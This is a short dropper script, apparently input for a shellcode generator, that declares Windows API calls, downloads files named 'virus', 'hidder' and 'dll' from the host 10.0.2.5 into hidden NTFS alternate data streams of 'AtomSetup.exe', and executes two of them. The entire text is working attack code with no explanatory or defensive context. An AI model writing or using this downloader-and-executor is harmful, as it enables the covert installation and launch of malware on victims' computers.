function URLDownloadToFileA("urlmon.dll");
function WinExec("kernel32.dll");
function ExitProcess("kernel32.dll");

URLDownloadToFileA(0,"http://10.0.2.5/virus","AtomSetup.exe:virus",0,0);
URLDownloadToFileA(0,"http://10.0.2.5/hidder","AtomSetup.exe:hidder",0,0);
URLDownloadToFileA(0,"http://10.0.2.5/dll","AtomSetup.exe:dll",0,0);
WinExec("AtomSetup.exe:hidder",0);
WinExec("AtomSetup.exe:virus",1);
